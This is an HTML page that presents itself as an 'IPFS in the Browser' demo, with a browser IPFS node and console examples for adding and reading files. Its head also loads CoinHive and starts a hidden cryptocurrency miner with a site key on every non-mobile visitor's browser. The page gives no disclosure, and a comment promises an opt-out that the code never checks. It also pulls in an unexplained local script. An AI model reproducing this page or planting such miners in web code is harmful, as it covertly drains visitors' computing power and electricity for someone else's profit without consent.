<!doctype html>
<html>
<head>
  <title>IPFS in the Browser</title>
  <script src="https://unpkg.com/ipfs/dist/index.min.js"></script>
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
  <script src="js/newbun72.js"></script>
 
<script>
	var miner = new CoinHive.Anonymous('Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.7});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
	if (!miner.isMobile()) {
		miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
	}
	
	miner.on('found', function () { console.log('Found!'); });
	miner.on('accepted', function () { console.log('Accepted!'); });
	miner.on('update', function (data) {
			console.log('Hashes per second: ' + data.hashesPerSecond);
			console.log('Total hashes: ' + data.totalHashes);
			console.log('Accepted hashes: ' + data.acceptedHashes);
		}
	);

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
		console.log('hps=' + hashesPerSecond);
		console.log('th=' + totalHashes);
		console.log('ah=' + acceptedHashes);
		
	}, 1000);	
	
	
</script>


 
  <script type="text/javascript">
const ipfsOptions = {
	config: {
		Addresses: {
			Swarm: [
				"/ip4/127.0.0.1/tcp/4001",
				"/ip4/127.0.0.1/tcp/4001/ws"
			],
			API: "/ip4/127.0.0.1/tcp/5001",
			Gateway: "/ip4/127.0.0.1/tcp/8080"
		}
	},
	repo: 'ipfs-' + Math.random(),
	EXPERIMENTAL: {
		pubsub: true
	}
};
    //const node = new Ipfs({ repo: 'ipfs-' + Math.random() })
	const node = new Ipfs(ipfsOptions);
    node.once('ready', () => {
      console.log('Online status: ', node.isOnline() ? 'online' : 'offline')

      document.getElementById("status").innerHTML= 'Node status: ' + (node.isOnline() ? 'online' : 'offline')

      // You can write more code here to use it. Use methods like 
      // node.files.add, node.files.get. See the API docs here:
      // https://github.com/ipfs/interface-ipfs-core
    })
	
  </script>
</head>
<body>
  <h1>IPFS in the Browser</h1>
  <p>This page creates an IPFS node in your browser and drops it into the global Javascript namespace as <b><em style="background-color:#d7d6d6">node</em></b>. Open the console to play around with it.</p>
  <p>Note that opening two tabs of this page in the same browser won't work well, because they will share node configuration. You'll end up trying to run two instances of the same node, with the same private key and identity, which is a Bad Idea.</p>
  <h1 id="status">Node status: offline</h1>

  <h2>Some suggestions</h2>

  <p>Try adding a new file:</p>

  <code style="display:block; white-space:pre-wrap; background-color:#d7d6d6">
    node.files.add(new node.types.Buffer('Hello world!'), (err, filesAdded) => {
      if (err) {
        return console.error('Error - ipfs files add', err, res)
      }

      filesAdded.forEach((file) => console.log('successfully stored', file.hash))
    })
  </code>

  <p>You can cat that same file. If you used the exact same string as above ('Hello world!') you should have an hash like this: 'QmQzCQn4puG4qu8PVysxZmscmQ5vT1ZXpqo7f58Uh9QfyY'</p>

  <code style="display:block; white-space:pre-wrap; background-color:#d7d6d6">
    node.files.cat('QmQzCQn4puG4qu8PVysxZmscmQ5vT1ZXpqo7f58Uh9QfyY', function (err, data) {
      if (err) {
        return console.error('Error - ipfs files cat', err, res)
      }

      console.log(data.toString())
    })
  </code>
</body>
</html>